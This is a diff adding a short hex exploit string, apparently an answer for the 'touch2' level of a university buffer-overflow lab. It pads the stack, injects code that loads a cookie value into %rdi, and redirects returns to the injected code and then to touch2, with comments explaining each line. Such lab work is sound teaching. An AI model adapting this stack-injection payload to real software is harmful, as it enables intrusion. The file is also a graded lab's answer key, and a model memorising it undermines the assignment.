@@ -1,0 +1,8 @@
+aa aa aa aa aa aa aa aa
+48 c7 c7 fa 97 b9 59      /* move the cookie value to the %rdi */ 
+c3                        /* return, which will pop another 8 bit address from the stack */
+aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa
+80 dc 61 55 00 00 00 00   /* the start point of the injected code */
+ec 17 40 00               /* the address of the touch2 function */ 
